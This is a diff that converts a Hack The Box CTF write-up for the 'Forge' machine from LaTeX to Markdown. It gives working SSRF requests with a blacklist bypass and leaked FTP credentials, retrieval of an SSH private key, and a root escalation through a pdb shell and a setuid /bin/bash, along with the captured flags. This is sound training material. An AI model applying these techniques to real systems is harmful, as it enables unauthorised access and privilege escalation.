@@ -1,26 +1,30 @@
-\chapter{Overview}
+---
+title: "Hack The Box - Writeup"
+author: c1sc0
+date: \today
+subtitle: Forge
+---
 
-\begin{wutable}[hidecap, colored]{l-l-l}{Name & IP & Difficulty}
-Forge & 10.10.11.111 & Medium \\
-\end{wutable}
+# Overview
+
+| Name  | IP           | Difficulty |
+|-------+--------------+------------|
+| Forge | 10.10.11.111 | Medium     |
 
 Basically you use a vulnerability in an upload function to read files from a locally bound web service. You are then able to follow the trace and extract a private key to login via ssh. Finally you exploit a script, which you are able to run as root and which drops you into a gdb shell on error. There you can gain a root session.
 
-\chapter{Recon}
+# Recon
 
-\section{nmap}
+## nmap
 
 Nmap results will give you three ports:
 
-\begin{compactitem}
-	\ttfamily
-\item 21/TCP, FTP, filtered
-\item 22/TCP, SSH, open
-\item 80/TCP, HTTP, open
-\end{compactitem}
+- 21/TCP, FTP, filtered
+- 22/TCP, SSH, open
+- 80/TCP, HTTP, open
 
-\begin{wulisting}[caption=nmap results]
-> §BL[sudo nmap -sC -sV -oA nmap/forge -vvv 10.10.11.111]BL§
+~~~ {.bash caption="nmap scan results"}
+> sudo nmap -sC -sV -oA nmap/forge -vvv 10.10.11.111
 
 PORT   STATE    SERVICE REASON         VERSION
 21/tcp filtered ftp     no-response
@@ -37,27 +41,28 @@ PORT   STATE    SERVICE REASON         VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 | http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
-\end{wulisting}
+~~~
 
-\section{Webapp port 80}
-If you direct your browser to \url{http://10.10.11.111} you will be redirected to \url{http://forge.htb}. Therefore we are adding this host to our \texttt{/etc/hosts} file.
+## Webapp port 80
 
-\wuimage[width=.5]{images/etc_hosts}{added forge.htb to /etc/hosts}
+If you direct your browser to [http://10.10.11.111](http://10.10.11.111) you will be redirected to [http://forge.htb](http://forge.htb). Therefore we are adding this host to our */etc/hosts* file.
 
-The website then shows us a \enquote{image gallery} and an \enquote{upload}-button in the top right corner.
+![added forge.htb to /etc/passwd](images/etc_hosts.png)
 
-\wuimage[]{images/website}{website on port 80 for forge.htb}
+The website then shows us an "image gallery and an "upload"-button in the top right corner.
 
-The upload dialog lets us upload either an image from disk or one from an url as can be seen from figure \vref{images/upload_image_button}.
+![](images/website.png)
 
-\wuimage[width=.6]{images/upload_image_button}{Upload image page}
+The upload dialog lets us upload either an image from disk or one from an url as can be seen from the figure \ref{testlabel}:
+
+![Upload image page\label{testlabel}](images/upload_image_button.png)
 
 We can easily upload an image but a file like a command shell will be blocked.
 
-Testing the \enquote{Upload from url} feature we can provoke a callback from the box to our attackers system:
+Testing the "Upload from url" feature we can provoke a callback from the box to our attackers system:
 
-\begin{wulisting}[caption=connection test]
-> §BL[sudo ncat -lnvp 80]BL§
+```bash
+> sudo ncat -lnvp 80
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::80
 Ncat: Listening on 0.0.0.0:80
@@ -69,13 +74,14 @@ User-Agent: python-requests/2.25.1
 Accept-Encoding: gzip, deflate
 Accept: */*
 Connection: keep-alive
-\end{wulisting}
+```
 
-\section{Virtual host enumaration}
-As this site at first did not give me anything else I decided to try and find other vhosts using \texttt{wfuzz}.
+## Virtual host enumeration
 
-\begin{wulisting}[caption=wfuzz vhost enumeration]
-> §BL[wfuzz -c -w ~/tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://forge.htb' -H "Host: FUZZ.forge.htb" --hw 26]BL§
+As this site at first did not give me anything else I decided to try and find other vhosts using *wfuzz*.
+
+```bash
+> wfuzz -c -w ~/tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://forge.htb' -H "Host: FUZZ.forge.htb" --hw 26
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
@@ -87,32 +93,32 @@ Total requests: 4989
 ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
-000000024:   200        1 L      4 W        27 Ch       §P["admin"]P§
+000000024:   200        1 L      4 W        27 Ch       "admin"
 
 Total time: 0
 Processed Requests: 4989
 Filtered Requests: 4988
 Requests/sec.: 0
-\end{wulisting}
+```
+Wfuzz is giving us the vhost admin. Therefore we add this to our "/etc/hosts"-file, too.
 
-Wfuzz is giving us the vhost admin. Therefore we add this to our \enquote{/etc/hosts}-file, too.
+## Webapp port 80 - vhost admin
 
-\section{Webapp port 80 - vhost admin}
 Looking at this page with a browser one will discover, that this page can only be accessed from an internal source, as the following figure shows.
 
-\wuimage[width=.5]{images/localhost_only}{Only localhost is allowed}
+![](images/localhost_only.png)
 
-We need to use a vulnerability in the main web application to access the app at \url{http://admin.forge.htb} from an interal source.
+We need to use a vulnerability in the main web application to access the app at http://admin.forge.htb from an interal source.
 
-But entering \texttt{http://admin.forge.htb} into the \enquote{Upload from url}-dialog will result in a blocked request due to a blacklist.
+But entering *http://admin.forge.htb* into the "Upload from url"-dialog will result in a blocked request due to a blacklist.
 
-\wuimage[width=.8]{images/blacklist}{Blacklist is in place}
+![](images/blacklist.png)
 
-We can easily bypass the blacklist by entering \texttt{http://\bfhtbpurple{A}dmin.\bfhtbpurple{F}orge.htb} as an url.
+We can easily bypass the blacklist by entering *http://**A**dmin.**F**orge.htb* as an url.
 
-If you look at this request other than in a browser (in my case I am using \texttt{Burp}) you are able to see the site as html markup. Within this response you can discover different other paths.
+If you look at this request other than in a browser (in my case I am using *Burp*) you are able to see the site as html markup. Within this response you can discover different other paths.
 
-\begin{wulisting}[caption=paths leaking]
+```bash
 <!DOCTYPE html>
 <html>
 <head>
@@ -123,8 +129,8 @@ If you look at this request other than in a browser (in my case I am using \text
 	<header>
 		<nav>
 		<h1 class=""><a href="/">Portal home</a></h1>
-		<h1 class="align-right margin-right"><a href="§P[/announcements]P§">Announcements</a></h1>
-		<h1 class="align-right"><a href="§P[/upload]P§">Upload image</a></h1>
+		<h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+		<h1 class="align-right"><a href="/upload">Upload image</a></h1>
 		</nav>
 	</header>
 	<br><br><br><br>
@@ -132,22 +138,22 @@ If you look at this request other than in a browser (in my case I am using \text
 	<center><h1>Welcome Admins!</h1></center>
 </body>
 </html>
-\end{wulisting}
+```
 
-Finally looking at \texttt{/announcments} we can discover credentials and some instructions:
+Finally looking at */announcments* we can discover credentials and some instructions:
 
-\begin{wulisting}[caption=credentials and announcment]
-An internal ftp server has been setup with credentials as §R[user:heightofsecurity123!]R§
+```bash
+An internal ftp server has been setup with credentials as user:heightofsecurity123!
 The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.
 The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<url>.
-\end{wulisting}
+```
 
-\chapter{Foothold}
-So next up the path is quite clear. We can access the internal \texttt{ftp} service, which was filtered in the nmap scan using the vulnerability in the main web application.
+# Initial foothold
+So next up the path is quite clear. We can access the internal *ftp* service, which was filtered in the nmap scan using the vulnerability in the main web application.
 
-\section{Exploit path}
+## Exploit path
 
-\begin{wulisting}[caption=POST request]
+```bash
 POST /upload HTTP/1.1
 Host: forge.htb
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
@@ -161,14 +167,14 @@ Connection: close
 Referer: http://forge.htb/upload
 Upgrade-Insecure-Requests: 1
 
-§BL[url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb&remote=1]BL§
-\end{wulisting}
+url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb&remote=1
+```
 
-You will receive an url where you can see the \enquote{uploaded image}. This url will reveal the information we requested.
+You will receive an url where you can see the "uploaded image". This url will reveal the information we requested.
 
 There you can see the content of the internal bound ftp server:
 
-\begin{wulisting}[caption=server reply]
+```bash
 HTTP/1.1 200 OK
 Date: Wed, 22 Sep 2021 10:17:13 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -181,13 +187,13 @@ Content-Type: image/jpg
 
 drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
 -rw-r-----    1 0        1000           33 Sep 21 10:27 user.txt
-\end{wulisting}
+```
 
-\section{Fetching user.txt}
+## Fetching user.txt
 
 This way we can also read the user.txt file directly requesting the url \url{http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Admin.Forge.htb/user.txt}.
 
-\begin{wulisting}[caption=reading the user.txt]
+```bash
 HTTP/1.1 200 OK
 Date: Wed, 22 Sep 2021 10:19:50 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -198,28 +204,28 @@ Cache-Control: no-cache
 Connection: close
 Content-Type: image/jpg
 
-§G[812765a195ec9d2bb2f47128019b176a]G§
-\end{wulisting}
+812765a195ec9d2bb2f47128019b176a
+```
 
-\section{Gaining shell}
+## Gaining shell
 
-So as we are a ftp user called \texttt{user} in a home directory we could also try ssh in with the creds:
+So as we are a ftp user called *user* in a home directory we could also try ssh in with the creds:
 
-\begin{wulisting}[caption=trying ssh connection]
-> §BL[ssh user@forge.htb]BL§
+```bash
+> ssh user@forge.htb
 The authenticity of host 'forge.htb (10.10.11.111)' can't be established.
 ED25519 key fingerprint is SHA256:ezqn5XF0Y3fAiyCDw46VNabU1GKFK0kgYALpeaUmr+o.
 This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'forge.htb' (ED25519) to the list of known hosts.
-user@forge.htb: §R[Permission denied (publickey).]R§
-\end{wulisting}
+user@forge.htb: Permission denied (publickey).
+```
 
 But as we discover we would need to have a private key to ssh into the box.
 
-So, hidden folders will not be displayed in listing. Right? But we get lucky and can retrieve the private key of user nonetheless as a key exists at \enquote{.ssh/id\_rsa}.
+So, hidden folders will not be displayed in listing. Right? But we get lucky and can retrieve the private key of user nonetheless as a key exists at ".ssh/id_rsa".
 
-\begin{wulisting}[caption=retrieving private key]
+```bash
 HTTP/1.1 200 OK
 Date: Wed, 22 Sep 2021 10:27:40 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -227,16 +233,16 @@ Content-Type: image/jpg
 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-§a[[ommited for readability]]a§
+[ommited for readability]
 shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-\end{wulisting}
+```
 
 Finally we can use this key to ssh into the box.
 
-\begin{wulisting}[caption=ssh session on box]
-> §BL[vim id_rsa]BL§
-> §BL[chmod 600 id_rsa]BL§
-> §BL[ssh -i id_rsa user@forge.htb]BL§
+```bash
+> vim id_rsa
+> chmod 600 id_rsa
+> ssh -i id_rsa user@forge.htb
 
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
 
@@ -264,23 +270,24 @@ To check for new updates run: sudo apt update
 
 Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
 user@forge:~$
-\end{wulisting}
+```
 
-\chapter{Privilege Escalation}
-First check is \texttt{sudo -l} and this will reveal we can run a python script as root.
+# Privilege escalation
 
-\begin{wulisting}[caption=output of sudo -l]
-user@forge:~$ §BL[sudo -l]BL§
+First check is `sudo -l` and this will reveal we can run a python script as root.
+
+```bash
+user@forge:~$ sudo -l
 Matching Defaults entries for user on forge:
 	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User user may run the following commands on forge:
-	§P[(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py]P§
-\end{wulisting}
+	(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+```
 
 So lets check what the script will do:
 
-\begin{wulisting}[language=python, caption=script we can run as root]
+```
 #!/usr/bin/env python3
 import socket
 import random
@@ -322,24 +329,24 @@ except Exception as e:
 	pdb.post_mortem(e.__traceback__)
 finally:
 	quit()
-\end{wulisting}
+```
 
-The last part of this script is quite interesting. We can see that the user gets to choose from a menu. Choices are 1 to 4. And there is also no default choice. So if one was to choose \enquote{a} for example we will crash the script and land in a pdb.post\_mortem shell. This could payout for us.
+The last part of this script is quite interesting. We can see that the user gets to choose from a menu. Choices are 1 to 4. And there is also no default choice. So if one was to choose "a" for example we will crash the script and land in a pdb.post_mortem shell. This could payout for us.
 
 So we need to ssh sessions for this.
 
 In the first ssh session we start the script like:
 
-\begin{wulisting}[caption=ssh session 1 - start server]
-user@forge:~$ §BL[sudo /usr/bin/python3 /opt/remote-manage.py]BL§
+```bash
+user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
 Listening on localhost:5959
-\end{wulisting}
+```
 
-In a second session we trigger the bug connecting to the socket and choose \enquote{a} from the menu. The password we need to enter one can find in the script itself.
+In a second session we trigger the bug connecting to the socket and choose "a" from the menu. The password we need to enter one can find in the script itself.
 
-\begin{wulisting}[caption=ssh session 2 - connect to server]
-user@forge:~$ §BL[nc localhost 5959]BL§
-Enter the secret passsword: §BL[secretadminpassword]BL§
+```bash
+user@forge:~$ nc localhost 5959
+Enter the secret password: secretadminpassword
 Welcome admin!
 
 What do you wanna do:
@@ -347,32 +354,32 @@ What do you wanna do:
 [2] View free memory
 [3] View listening sockets
 [4] Quit
-§BL[a]BL§
-\end{wulisting}
+a
+```
 
 After triggering we can look at our first session and have an interactive shell there.
 
-\begin{wulisting}[caption=ssh session 1 - gdb shell]
+```
 invalid literal for int() with base 10: b'a'
 > /opt/remote-manage.py(27)<module>()
 -> option = int(clientsock.recv(1024).strip())
-(Pdb) §BL[1+1]BL§
+(Pdb) 1+1
 2
-(Pdb) §BL[import os]BL§
-(Pdb) §BL[os.system("id")]BL§
+(Pdb) import os
+(Pdb) os.system("id")
 uid=0(root) gid=0(root) groups=0(root)
-(Pdb) §BL[os.system("chmod 4775 /bin/bash")]BL§
-(Pdb) §BL[exit]BL§
-\end{wulisting}
+(Pdb) os.system("chmod 4775 /bin/bash")
+(Pdb) exit
+```
 
-I chose to modify \enquote{/bin/bash} with a setuid bit to gain an interactive shell afterwards.
+I chose to modify "/bin/bash" with a setuid bit to gain an interactive shell afterwards.
 
-\begin{wulisting}[caption=grabbing root.txt]
-user@forge:~$ §BL[/bin/bash -p]BL§
-bash-5.0# §BL[id]BL§
-uid=1000(user) gid=1000(user) §R[euid=0(root)]R§ groups=1000(user)
-bash-5.0# §BL[cd /root]BL§
-bash-5.0# §BL[cat root.txt]BL§
-§G[ae37345dd6a5cf9001c7668496ab77c3]G§
+```bash
+user@forge:~$ /bin/bash -p
+bash-5.0# id
+uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+ae37345dd6a5cf9001c7668496ab77c3
 bash-5.0#
-\end{wulisting}
+```
